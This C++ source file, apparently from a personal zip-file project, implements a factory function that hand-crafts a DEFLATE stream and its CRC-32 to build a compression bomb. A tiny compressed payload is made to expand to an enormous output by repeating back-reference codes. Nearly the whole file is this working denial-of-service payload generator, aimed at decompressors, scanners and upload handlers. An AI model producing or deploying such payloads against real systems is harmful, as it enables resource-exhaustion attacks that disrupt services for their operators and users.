//
// Created by LeeEeZian on 30/9/2026.
//
#include "factory/PayloadFactory.h"
#include "deflation/lz77.h"
#include "deflation/BitWriter.h"
#include "zip_file_construction/LocalFileHeader.h"
#include <chrono>
#include <iostream>
#include <numeric>
#include <cmath>

namespace {
    void repeatInPlace(std::vector<uint8_t> &vector, const size_t n) {
        if (n <= 1) return;
        const size_t originalSize{vector.size()};
        vector.resize(vector.size() * n);

        size_t newSize{originalSize};
        while (newSize < vector.size()) {
            std::copy_n(vector.begin(), originalSize, vector.begin() + static_cast<long long>(newSize));
            newSize += originalSize;
        }
    }
}

DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
    const auto startTime{std::chrono::steady_clock::now()};
    using namespace lz77;
    BitWriter writer;

    writer.add(HuffmanTable::BFINAL::YES, 1);
    writer.add(HuffmanTable::BTYPE::FIXED_HUFFMAN, 2);

    auto [code, length]{HuffmanTable::fixedSymbolTable('a')};

    const int headerBitLength{3 + length};

    writer.add(code, length);

    constexpr int bytesToCopy{256};

    const MatchCode lengthCode{lz77::getLengthCode(bytesToCopy)};
    const MatchCode distanceCode{lz77::getDistanceCode(1)};
    auto [lCode, lLength]{HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
    auto [dCode, dLength]{HuffmanTable::fixedDistanceTable(distanceCode.symbol)};

    const int totalRepeatableBits{lLength + dLength + lengthCode.extraBit + distanceCode.extraBit};

    const int bytesTillRepeat{std::lcm(8, totalRepeatableBits) / 8};
    const int iterationsTillRepeat{std::lcm(8, totalRepeatableBits) / totalRepeatableBits};

    for (size_t i{}; i < iterationsTillRepeat * 2; ++i) {
        writer.add(lCode, lLength);
        writer.add(lengthCode.extraValue, lengthCode.extraBit);

        writer.add(dCode, dLength);
        writer.add(distanceCode.extraValue, distanceCode.extraBit);
    }

    auto [endCode, endLength]{HuffmanTable::fixedSymbolTable(256)};
    writer.add(endCode, endLength);

    std::vector<uint8_t> all{writer.release()};

    const long long periodStart{((headerBitLength + bytesTillRepeat * 8) / 8)};

    const std::vector<uint8_t> start{all.begin(), all.begin() + periodStart};
    std::vector<uint8_t> period{all.begin() + periodStart, all.begin() + periodStart + bytesTillRepeat};
    std::vector<uint8_t> end{all.begin() + periodStart + bytesTillRepeat, all.end()};

    std::vector<uint8_t> data{start};
    data.reserve(start.size() + period.size() * (size - 1) + end.size());

    const size_t totalIterations = 4 * size;
    const size_t numberOfPeriods = totalIterations / iterationsTillRepeat;

    size_t remainingPeriods{numberOfPeriods - 1};
    std::vector<uint8_t> tempPeriod{period.begin(), period.end()};
    while (remainingPeriods) {
        if (remainingPeriods & 1) {
            data.insert(data.end(), tempPeriod.begin(), tempPeriod.end());
        }

        remainingPeriods >>= 1;
        repeatInPlace(tempPeriod,2);

    }

    data.insert(data.end(), end.begin(), end.end());

    const size_t repeatedData{4 * size * bytesToCopy};

    const size_t uncompressedSize{repeatedData + 1};

    Crc32 BombCrc32{};

    Crc32 block{};
    block.update('a');
    block.computeCrc32();

    size_t remaining{uncompressedSize};
    while (remaining) {
        if (remaining & 1) {
            BombCrc32.combine(block);
        }

        block.combine(block);
        remaining >>= 1;
    }

    const auto endTime{std::chrono::steady_clock::now()};
    const auto elapsed{std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime)};

    std::cout << "Total time of for bomb crc calculation " << elapsed << '\n';
    return {.data = data, .uncompressedSize = uncompressedSize, .crc32 = BombCrc32.getCrc32()};
}
